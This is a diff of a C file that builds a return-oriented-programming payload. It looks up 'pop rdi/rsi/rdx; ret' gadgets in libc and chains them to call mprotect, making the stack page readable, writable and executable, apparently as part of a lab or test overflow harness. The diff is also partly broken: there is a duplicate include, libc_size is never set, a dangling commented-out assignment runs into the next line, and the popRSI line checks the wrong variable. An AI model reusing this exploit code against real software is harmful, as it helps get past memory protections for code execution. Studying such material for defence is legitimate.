@@ -6,6 +6,7 @@
 #include <stddef.h>
 #include <stdio.h>
 #include <string.h>
+#include <string.h>
 #include <unistd.h>
 
 static const unsigned char tEncode64[64] = {
@@ -140,6 +141,9 @@ static const char *s_testload = "TESTLOAD";
 static const char *s_overflow = "OVERFLOW";
 
 static const char *s_libc_base     = "base";
+static const char  s_libc_popRDI[] = {0x5f, 0xc3, 0};
+static const char  s_libc_popRSI[] = {0x5e, 0xc3, 0};
+static const char  s_libc_popRDX[] = {0x5a, 0xc3, 0};
 static const char *s_libc_mprotect = "mprotect";
 static const char *s_libc_read     = "read";
 
@@ -192,6 +196,10 @@ _Bool initialized = 0;
 ssize_t (*libc_read)(int fd, void *buf, size_t count)	= NULL;
 Pointer libc_mprotect					= NULL;
 Pointer libc_base					= NULL;
+size_t  libc_size					= 0;
+Pointer libc_popRDI					= NULL;
+Pointer libc_popRSI					= NULL;
+Pointer libc_popRDX					= NULL;
 Pointer pie_base					= NULL;
 Pointer stack_base					= NULL;
 Pointer buffer_base					= NULL;
@@ -215,6 +223,25 @@ static Pointer stackPage(void) {
 	return pageBase(&dummy);
 } // stackBase()
 
+static char *strnstr(const char *s1, const char *s2, size_t len)
+{
+	size_t l2 = strlen(s2);
+
+	if (!l2)
+		return (char *)s1;
+	while (len >= l2) {
+		len--;
+		if (!memcmp(s1, s2, l2))
+			return (char *)s1;
+		s1++;
+	}
+	return NULL;
+}
+
+static Pointer findGadget(const Pointer start, const char *gadget, const size_t size){
+     return strnstr(libc_base, gadget, size);
+} // findGadget()
+
 static void initialize(void)
 {
 	if (!initialized)
@@ -222,6 +249,10 @@ static void initialize(void)
 		libc_read	= dlsym(RTLD_NEXT, s_libc_read);
 		libc_mprotect	= dlsym(RTLD_NEXT, s_libc_mprotect);
 		libc_base	= elfBase(libc_mprotect);
+
+		libc_popRDI	= findGadget(libc_base, s_libc_popRDI, libc_size);
+		libc_popRSI	= // NULL; //findGadget(libc_base, s_libc_popRSI, libc_size);
+		libc_popRDX	= findGadget(libc_base, s_libc_popRDX, libc_size);
 
 		pie_base	= elfBase(initialize);
 
@@ -238,7 +269,7 @@ static Pointer baseAddress(char base) {
 		case 'B' : return buffer_base;
 		case 'L' : return libc_base;
 		case 'S' : return stack_base; // Actually just base of current stack page
-		case 'X' : return pie_base;
+		case 'P' : return pie_base;
 		default  : return 0;
 	} // switch
 } // baseAddress()
@@ -304,11 +335,11 @@ static void makeload(PayloadPtr plp) {
 
 	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B');
 	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B');
-	plp->pl_popRDI.o	= pointerToOffset(&&l_poprdi, 'X');
+	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L'):pointerToOffset(&&l_popRDI, 'P');;
 	plp->pl_stackPage.o	= pointerToOffset(stack_base, 'S');
-	plp->pl_popRSI.o	= pointerToOffset(&&l_poprsi, 'X');
+	plp->pl_popRSI.o	= libc_popRDI?pointerToOffset(libc_popRSI, 'L'):pointerToOffset(&&l_popRSI, 'P');;
 	plp->pl_stackSize	= getpagesize();
-	plp->pl_popRDX.o	= pointerToOffset(&&l_poprdx, 'X');
+	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L'):pointerToOffset(&&l_popRDX, 'P');;
 	plp->pl_permission	= 0x7;
 	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L');
 
@@ -323,21 +354,21 @@ static void makeload(PayloadPtr plp) {
 
 	// Gadget for "POP RDI"
 	if (v) {
-l_poprdi:
+l_popRDI:
 		__asm__ ("pop %rdi");
 		__asm__ ("ret");
 	}
 
 	// Gadget for "POP RSI"
 	if (v) {
-l_poprsi:
+l_popRSI:
 		__asm__ ("pop %rsi");
 		__asm__ ("ret");
 	}
 
 	// Gadget for "POP RDX"
 	if (v) {
-l_poprdx:
+l_popRDX:
 		__asm__ ("pop %rdx");
 		__asm__ ("ret");
 	}
